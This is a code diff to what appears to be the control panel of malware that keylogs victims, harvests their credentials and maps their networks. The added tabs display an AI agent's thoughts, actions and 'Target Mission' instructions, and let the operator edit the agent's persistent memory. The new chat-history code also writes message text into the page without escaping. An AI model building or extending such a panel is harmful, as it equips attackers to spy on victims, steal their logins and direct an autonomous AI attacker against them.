@@ -269,6 +269,8 @@
                 <button class="tab-btn active" onclick="openTab(event, 'tab-keylog')" id="btn-tab-keylog">⌨️ Live Keylog</button>
                 <button class="tab-btn" onclick="openTab(event, 'tab-creds')" id="btn-tab-creds">🔑 Credentials</button>
                 <button class="tab-btn" onclick="openTab(event, 'tab-network')" id="btn-tab-network">🕸️ Network Map</button>
+                <button class="tab-btn" onclick="openTab(event, 'tab-chat')" id="btn-tab-chat">🤖 AI Chat History</button>
+                <button class="tab-btn" onclick="openTab(event, 'tab-memory')" id="btn-tab-memory">🧠 AI Memory</button>
             </div>
             <div id="tab-keylog" class="tab-content active">
                 <div style="margin-bottom: 10px; display: flex; justify-content: space-between;">
@@ -297,6 +299,30 @@
                     <button class="quick-skill-btn" onclick="fetchAgentData('network')">🔄 Refresh</button>
                 </div>
                 <pre id="networkData" style="white-space: pre-wrap; color: #60a5fa;">Run Mission 1 (Recon) to map network...</pre>
+            </div>
+            <div id="tab-chat" class="tab-content">
+                <div style="margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center;">
+                    <span style="color:#a1a1aa;">Live logs of AI thoughts, actions, and system feedback.</span>
+                    <button class="quick-skill-btn" onclick="fetchAgentData('ai_history')">🔄 Refresh</button>
+                </div>
+                <div id="chatHistoryBox" style="background: #0a0a0c; padding: 15px; border-radius: 6px; border: 1px solid #1f2937; height: 180px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; box-shadow: inset 0 0 10px rgba(0,0,0,0.5);">
+                    <p style="text-align: center; color: #71717a; font-style: italic; margin: auto;">Select a target to see AI conversation history...</p>
+                </div>
+            </div>
+            <div id="tab-memory" class="tab-content">
+                <div style="margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center;">
+                    <span style="color:#a1a1aa;">AI's Long-Term Memory database. Transcends restarts.</span>
+                    <button class="quick-skill-btn" onclick="loadAIMemory()">🔄 Refresh</button>
+                </div>
+                
+                <div style="display: flex; gap: 10px; margin-bottom: 15px;">
+                    <input type="text" id="newMemoryInput" placeholder="Add a new fact to AI memory (e.g. 'Windows directory: C:\Windows')" style="flex: 1; padding: 10px; border-radius: 6px; border: 1px solid #3f3f46; background: #27272a; color: white;">
+                    <button class="quick-skill-btn" style="background: #8b5cf6; border: none; color: white; padding: 10px 15px;" onclick="addAIMemoryFact()">➕ Add Fact</button>
+                </div>
+
+                <div id="memoryBox" style="background: #0a0a0c; padding: 15px; border-radius: 6px; border: 1px solid #1f2937; height: 140px; overflow-y: auto; display: flex; flex-direction: column; gap: 8px; box-shadow: inset 0 0 10px rgba(0,0,0,0.5);">
+                    <p style="text-align: center; color: #71717a; font-style: italic; margin: auto;">Loading AI memory database...</p>
+                </div>
             </div>
         </div>
 
@@ -575,12 +601,22 @@
             if (tabName === 'tab-keylog') activeTabType = 'keylog';
             if (tabName === 'tab-creds') activeTabType = 'passwords';
             if (tabName === 'tab-network') activeTabType = 'network';
+            if (tabName === 'tab-chat') activeTabType = 'ai_history';
+            if (tabName === 'tab-memory') {
+                activeTabType = 'memory';
+                loadAIMemory();
+                return;
+            }
             
             fetchAgentData(activeTabType);
         }
 
         function refreshActiveTab() {
-            fetchAgentData(activeTabType);
+            if (activeTabType === 'memory') {
+                loadAIMemory();
+            } else {
+                fetchAgentData(activeTabType);
+            }
         }
 
         async function fetchAgentData(type) {
@@ -616,15 +652,144 @@
                     const el = document.getElementById('networkData');
                     if (!data.data) el.textContent = "No network map available. Run Recon mission.";
                     else el.textContent = data.data;
+                } else if (type === 'ai_history') {
+                    const box = document.getElementById('chatHistoryBox');
+                    if (!data || data.length === 0) {
+                        box.innerHTML = '<p style="text-align: center; color: #71717a; font-style: italic; margin: auto;">No chat history recorded yet.</p>';
+                    } else {
+                        box.innerHTML = '';
+                        data.forEach(msg => {
+                            const div = document.createElement('div');
+                            div.style.padding = '8px 12px';
+                            div.style.borderRadius = '4px';
+                            div.style.background = '#131316';
+                            div.style.border = '1px solid #1f2937';
+                            div.style.fontFamily = 'monospace';
+                            div.style.fontSize = '12px';
+                            
+                            if (msg.role === 'assistant') {
+                                if (msg.content.startsWith('thought:')) {
+                                    div.style.borderLeft = '3px solid #f59e0b';
+                                    div.innerHTML = `<span style="color: #fbbf24; font-weight: bold;">🧠 AI Thought:</span> <span style="font-style: italic; color: #fef08a; opacity: 0.95;">${msg.content.substring(8)}</span>`;
+                                } else {
+                                    div.style.borderLeft = '3px solid #8b5cf6';
+                                    div.innerHTML = `<span style="color: #c084fc; font-weight: bold;">🤖 AI Action:</span> ${msg.content}`;
+                                }
+                            } else {
+                                if (msg.content.startsWith('[SYSTEM]')) {
+                                    div.style.borderLeft = '3px solid #3b82f6';
+                                    div.innerHTML = `<span style="color: #60a5fa; font-weight: bold;">⚙️ System Feedback:</span> ${msg.content}`;
+                                } else {
+                                    div.style.borderLeft = '3px solid #10b981';
+                                    div.innerHTML = `<span style="color: #34d399; font-weight: bold;">👤 Target Mission:</span> ${msg.content}`;
+                                }
+                            }
+                            box.appendChild(div);
+                        });
+                        box.scrollTop = box.scrollHeight;
+                    }
                 }
             } catch (err) {
                 console.error("Fetch API Error:", err);
+            }
+        }
+
+        // Memory DB client logic
+        let localMemory = { facts: [], lessons: [], notes: [] };
+
+        async function loadAIMemory() {
+            try {
+                const res = await fetch('/api/memory');
+                localMemory = await res.json();
+                renderAIMemory();
+            } catch (err) {
+                console.error("Failed to load memory:", err);
+            }
+        }
+
+        function renderAIMemory() {
+            const box = document.getElementById('memoryBox');
+            const facts = localMemory.facts || [];
+            
+            if (facts.length === 0) {
+                box.innerHTML = '<p style="text-align: center; color: #71717a; font-style: italic; margin: auto;">AI Memory is empty. Add a fact or let the AI discover details.</p>';
+            } else {
+                box.innerHTML = '';
+                facts.forEach((fact, idx) => {
+                    const row = document.createElement('div');
+                    row.style.display = 'flex';
+                    row.style.justify = 'space-between';
+                    row.style.alignItems = 'center';
+                    row.style.padding = '8px 12px';
+                    row.style.background = '#131316';
+                    row.style.border = '1px solid #1f2937';
+                    row.style.borderRadius = '6px';
+                    
+                    const span = document.createElement('span');
+                    span.textContent = `💡 ${fact}`;
+                    span.style.fontSize = '12px';
+                    span.style.color = '#e4e4e7';
+                    
+                    const delBtn = document.createElement('button');
+                    delBtn.textContent = '❌';
+                    delBtn.style.padding = '2px 6px';
+                    delBtn.style.background = 'transparent';
+                    delBtn.style.border = 'none';
+                    delBtn.style.cursor = 'pointer';
+                    delBtn.style.fontSize = '10px';
+                    delBtn.onclick = () => deleteAIMemoryFact(idx);
+                    
+                    row.appendChild(span);
+                    row.appendChild(delBtn);
+                    box.appendChild(row);
+                });
+            }
+        }
+
+        async function addAIMemoryFact() {
+            const input = document.getElementById('newMemoryInput');
+            const val = input.value.trim();
+            if (!val) return;
+            
+            if (!localMemory.facts) localMemory.facts = [];
+            if (!localMemory.facts.includes(val)) {
+                localMemory.facts.push(val);
+                try {
+                    await fetch('/api/memory', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(localMemory)
+                    });
+                    input.value = '';
+                    loadAIMemory();
+                    log(`Manually added to AI Memory: "${val}"`);
+                } catch(e) {
+                    console.error("Save memory error:", e);
+                }
+            }
+        }
+
+        async function deleteAIMemoryFact(idx) {
+            if (!localMemory.facts) return;
+            const removed = localMemory.facts.splice(idx, 1);
+            try {
+                await fetch('/api/memory', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(localMemory)
+                });
+                loadAIMemory();
+                log(`Removed from AI Memory: "${removed}"`);
+            } catch(e) {
+                console.error("Save memory error:", e);
             }
         }
         
         // Load persisted data on startup
         window.addEventListener('DOMContentLoaded', async () => {
             try {
+                loadAIMemory(); // Initial load of AI Memory
+                
                 const res = await fetch('/api/persisted');
                 const data = await res.json();
                 
